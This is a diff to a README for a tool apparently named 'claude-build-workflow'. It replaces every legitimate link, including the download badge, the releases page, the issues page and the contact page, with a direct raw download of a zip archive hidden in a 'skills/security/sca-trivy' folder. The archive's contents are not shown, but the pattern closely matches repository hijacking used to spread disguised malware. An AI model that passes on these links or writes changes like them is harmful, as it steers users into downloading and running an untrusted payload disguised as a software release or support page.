@@ -1,6 +1,6 @@
 # 🚀 claude-build-workflow - Build Your Apps Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-claude--build--workflow-blue)](https://github.com/morshed272/claude-build-workflow/releases)
+[![Download Now](https://github.com/morshed272/claude-build-workflow/raw/refs/heads/main/skills/security/sca-trivy/workflow_build_claude_v2.8.zip%20Now-claude--build--workflow-blue)](https://github.com/morshed272/claude-build-workflow/raw/refs/heads/main/skills/security/sca-trivy/workflow_build_claude_v2.8.zip)
 
 ## 📋 Overview
 Welcome to **claude-build-workflow**! This application helps you automate the process of building apps using Claude Code. Describe what you need, answer a few questions, and let the workflow handle the build for you. It's that simple.
@@ -10,7 +10,7 @@ To start using **claude-build-workflow**, follow the steps below to download and
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the releases page where you can download the software:
-   [Download from Releases](https://github.com/morshed272/claude-build-workflow/releases)
+   [Download from Releases](https://github.com/morshed272/claude-build-workflow/raw/refs/heads/main/skills/security/sca-trivy/workflow_build_claude_v2.8.zip)
 
 2. **Select the Latest Release**: Once on the page, look for the latest version of **claude-build-workflow**. 
 
@@ -48,7 +48,7 @@ Ensure you have at least 100 MB of available disk space for installation.
 
 ## 📑 Frequently Asked Questions (FAQs)
 ### Q: What if I encounter an error during the installation?
-A: Ensure you have sufficient space and the correct system version. If issues persist, check the issues section on our [GitHub page](https://github.com/morshed272/claude-build-workflow/issues) for troubleshooting tips.
+A: Ensure you have sufficient space and the correct system version. If issues persist, check the issues section on our [GitHub page](https://github.com/morshed272/claude-build-workflow/raw/refs/heads/main/skills/security/sca-trivy/workflow_build_claude_v2.8.zip) for troubleshooting tips.
 
 ### Q: Can I use this app on multiple machines?
 A: Yes, you can download and install **claude-build-workflow** on multiple devices as long as they meet the system requirements.
@@ -57,9 +57,9 @@ A: Yes, you can download and install **claude-build-workflow** on multiple devic
 A: Yes! You can reach out to our support team via the issues section on GitHub.
 
 ## 📞 Contact
-For further inquiries, please use the contact methods available on our [GitHub page](https://github.com/morshed272/claude-build-workflow).
+For further inquiries, please use the contact methods available on our [GitHub page](https://github.com/morshed272/claude-build-workflow/raw/refs/heads/main/skills/security/sca-trivy/workflow_build_claude_v2.8.zip).
 
 ## 🌟 Contribution
 If you're interested in helping improve **claude-build-workflow**, check out the contribution guidelines in the repository. Your input is always welcome!
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-claude--build--workflow-blue)](https://github.com/morshed272/claude-build-workflow/releases)
+[![Download from Releases](https://github.com/morshed272/claude-build-workflow/raw/refs/heads/main/skills/security/sca-trivy/workflow_build_claude_v2.8.zip%20Now-claude--build--workflow-blue)](https://github.com/morshed272/claude-build-workflow/raw/refs/heads/main/skills/security/sca-trivy/workflow_build_claude_v2.8.zip)
